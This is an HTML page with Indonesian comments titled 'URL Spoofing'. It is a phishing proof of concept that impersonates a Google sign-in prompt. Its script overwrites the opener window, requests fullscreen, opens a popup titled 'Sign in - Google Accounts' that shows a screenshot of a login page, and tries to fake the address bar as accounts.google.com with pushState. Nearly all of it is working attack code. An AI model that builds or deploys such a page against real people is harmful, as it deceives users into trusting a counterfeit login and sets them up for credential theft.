<!DOCTYPE html>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no">
    <title>URL Spoofing</title>
    
    <style>
        #button {
            width: 150px;
            height: 35px;
        }
    </style>
    
    <script>
        function spoof() {
            // Template HTML harus dalam string (gunakan backticks)
            const openerHTML = `
                <html>
                <head>
                    <style>
                        body {
                            margin: 0;
                            padding: 0;
                            overflow: hidden;
                        }
                        #content {
                            width: 100%;
                            height: 100%;
                            display: block;
                        }
                    </style>
                </head>
                <body>
                    <img id="content" src="spoof.png" alt="Spoof Image">
                </body>
                </html>
            `;

            const popupHTML = `
                <html>
                <head>
                    <title>Sign in - Google Accounts</title>
                    <style>
                        body {
                            margin: 0;
                            padding: 0;
                            overflow: hidden;
                        }
                        #content {
                            width: 100%;
                            height: 100%;
                            display: block;
                        }
                    </style>
                </head>
                <body>
                    <img id="content" src="sign.png" alt="Sign Image">
                </body>
                </html>
            `;

            // Dimensi popup
            const width = 500;
            const height = 460;
            const left = (screen.width / 2) - (width / 2);

            // ---- FULLSCREEN FALLBACK ----
            if (window.opener && window.opener.document.documentElement.requestFullscreen) {
                window.opener.document.documentElement
                    .requestFullscreen()
                    .catch(() => {
                        console.log("Fullscreen request denied");
                    });
            }

            // ---- SPOOF MAIN WINDOW ----
            if (window.opener) {
                try {
                    window.opener.document.open();
                    window.opener.document.write(openerHTML);
                    window.opener.document.close();
                } catch (e) {
                    console.warn("Cannot modify opener:", e);
                }
            }

            // ---- OPEN POPUP ----
            const win = window.open(
                "about:blank",
                "_blank",
                `width=${width},height=${height},top=0,left=${left}`
            );

            // Inject konten ke popup dengan delay
            setTimeout(() => {
                try {
                    win.document.open();
                    win.document.write(popupHTML);
                    win.document.close();

                    // Attempt to fake URL bar (akan diblock di browser modern)
                    try {
                        win.history.pushState({}, "", "https://accounts.google.com/signin");
                    } catch (e) {
                        console.warn("pushState blocked:", e);
                    }
                } catch (e) {
                    console.warn("Blocked by browser protections:", e);
                }
            }, 50);

            // ---- CLOSE CURRENT WINDOW ----
            window.close();
        }
    </script>
</head>

<body>
    <center>
        <br>
        <h1>
            Please confirm you want to sign in into your Google Account<br><br>
            <button id="button" onclick="spoof();">Confirm</button>
        </h1>
    </center>
</body>
</html>
